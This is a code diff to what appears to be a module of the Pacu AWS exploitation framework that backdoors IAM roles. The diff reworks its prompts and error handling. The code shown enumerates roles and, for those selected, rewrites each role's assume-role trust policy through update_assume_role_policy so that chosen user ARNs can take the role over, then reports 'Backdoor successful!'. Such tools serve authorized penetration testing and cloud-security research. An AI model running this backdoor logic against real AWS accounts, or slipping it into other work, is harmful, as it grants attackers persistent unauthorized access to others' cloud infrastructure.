@@ -3,6 +3,8 @@ import argparse
 import json
 from random import choice
 
+from botocore.exceptions import ClientError
+
 
 module_info = {
     # Name of the module (should be the same as the filename)
@@ -44,6 +46,7 @@ def main(args, pacu_main):
     ###### Don't modify these. They can be removed if you are not using the function.
     args = parser.parse_args(args)
     print = pacu_main.print
+    input = pacu_main.input
     key_info = pacu_main.key_info
     fetch_data = pacu_main.fetch_data
     get_aws_key_by_alias = pacu_main.get_aws_key_by_alias
@@ -56,17 +59,14 @@ def main(args, pacu_main):
     summary_data = {}
 
     if args.role_names is None:
-        all = input('No role names were passed in as arguments, do you want to enumerate all roles and get a prompt for each one (y) or exit (n)? (y/n) ')
-        if all.lower() == 'n':
-            print('Exiting...')
-            return
-
+        print('Fetching Roles... ')
         if fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles') is False:
-            print('Pre-req module not run. Exiting...')
+            print('Sub-module Execution Failed')
+            print('  Exiting...')
             return
         for role in session.IAM['Roles']:
             rolenames.append(role['RoleName'])
-
+        print('{} Role(s) Found'.format(len(session.IAM['Roles'])))
     else:
         rolenames = args.role_names.split(',')
 
@@ -90,31 +90,35 @@ def main(args, pacu_main):
 
     iam = pacu_main.get_boto3_resource('iam')
     backdoored_role_count = 0
+    print('Backdoor the following roles?')
     for rolename in rolenames:
         target_role = 'n'
         if args.role_names is None:
-            target_role = input('  Do you want to backdoor the role {}? (y/n) '.format(rolename))
+            target_role = input('  {}  (Y/N) '.format(rolename))
 
-        if target_role == 'y' or args.role_names is not None:
-            print('Role name: {}'.format(rolename))
-            role = iam.Role(rolename)
-            original_policy = role.assume_role_policy_document
-            hacked_policy = modify_assume_role_policy(original_policy, user_arns, args.no_random)
-
+        if target_role.lower() == 'y' or args.role_names is not None:
+            print('    Backdooring {}...'.format(rolename))
             try:
+                role = iam.Role(rolename)
+                original_policy = role.assume_role_policy_document
+                hacked_policy = modify_assume_role_policy(original_policy, user_arns, args.no_random)
                 client.update_assume_role_policy(
                     RoleName=rolename,
                     PolicyDocument=json.dumps(hacked_policy)
                 )
-                print('  Backdoor successful!\n')
+                print('    Backdoor successful!')
                 backdoored_role_count += 1
-            except Exception as error:
-                if 'UnmodifiableEntity' in str(error):
-                    print('  Failed to update the assume role policy document for role {}: This is a protected service role that is only modifiable by AWS.\n'.format(rolename))
+            except ClientError as error:
+                print('      FAILURE:')
+                code = error.response['Error']['Code']
+                if code == 'UnmodifiableEntity':
+                    print('        SERVICE PROTECTED BY AWS')
+                elif code == 'AccessDenied':
+                    print('        MISSING NEEDED PERMISSIONS')
                 else:
-                    print('  Failed to update the assume role policy document for role {}: {}\n'.format(rolename, error))
+                    print('        {}'.format(code))
     summary_data['RoleCount'] = backdoored_role_count
-    print('{} completed.\n'.format(module_info['name']))
+    print('\n{} completed.\n'.format(module_info['name']))
     return summary_data
 
 
